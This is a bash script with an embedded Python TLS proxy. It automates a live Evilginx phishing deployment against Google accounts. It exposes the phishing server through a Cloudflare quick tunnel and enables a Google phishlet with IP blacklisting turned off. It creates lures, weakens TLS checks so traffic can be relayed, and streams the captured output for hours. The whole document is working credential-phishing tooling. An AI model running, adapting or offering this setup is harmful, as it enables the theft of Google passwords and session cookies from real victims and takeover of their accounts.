#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true
pkill -f proxy.py 2>/dev/null || true

echo "--- phase 1: get tunnel url ---"
nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:9443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL"
HOST="${URL#https://}"

echo "--- strong 2048 cert for front proxy ---"
openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/front.key -out /tmp/front.pem -days 1 -subj "/CN=$HOST" 2>/dev/null

echo "--- evilginx on 443 (full setup) ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; echo "lures create google"; sleep 1; echo "lures edit 0 hostname $HOST"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

EG=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; EG=1; break; fi
  sleep 2
done
echo "EVILGINX_443=$EG"

echo "--- python splice :9443 -> evilginx :443 (weak-key tolerant) ---"
cat > /tmp/proxy.py <<'PYEOF'
import socket, ssl, threading, sys
PORT=int(sys.argv[1]); BE=('127.0.0.1',443); SNI=sys.argv[2]; CERT=sys.argv[3]; KEY=sys.argv[4]
def relay(a,b):
    def r(s,t):
        try:
            while True:
                d=s.recv(65536)
                if not d: break
                t.sendall(d)
        except Exception: pass
        finally:
            try: t.shutdown(socket.SHUT_WR)
            except Exception: pass
    x=threading.Thread(target=r,args=(a,b)); y=threading.Thread(target=r,args=(b,a))
    x.start(); y.start(); x.join(); y.join()
    for s in (a,b):
        try: s.close()
        except Exception: pass
def main():
    ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(CERT,KEY)
    bev=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); bev.check_hostname=False; bev.verify_mode=ssl.CERT_NONE
    try: bev.set_ciphers('DEFAULT:@SECLEVEL=1')
    except Exception: pass
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(('127.0.0.1',PORT)); s.listen(50)
    while True:
        c,_=s.accept()
        threading.Thread(target=lambda cl=c: (lambda: (relay(ctx.wrap_socket(cl,server_side=True), bev.wrap_socket(socket.create_connection(BE,timeout=10),server_hostname=SNI))))(),daemon=True).start()
main()
PYEOF
nohup python3 /tmp/proxy.py 9443 "$HOST" /tmp/front.pem /tmp/front.key > proxy.log 2>&1 &
sleep 3

BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/9443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "PROXY_9443_BOUND=$BOUND"
sleep 10
echo "--- edge probe ---"
curl -sS -m 20 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
head -c 250 /tmp/edge.out 2>/dev/null || true
echo ""
echo "--- proxy log ---"
tail -n 6 proxy.log 2>/dev/null || echo "(empty)"

echo "=== streaming evilginx output ==="
trap 'kill %4 %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
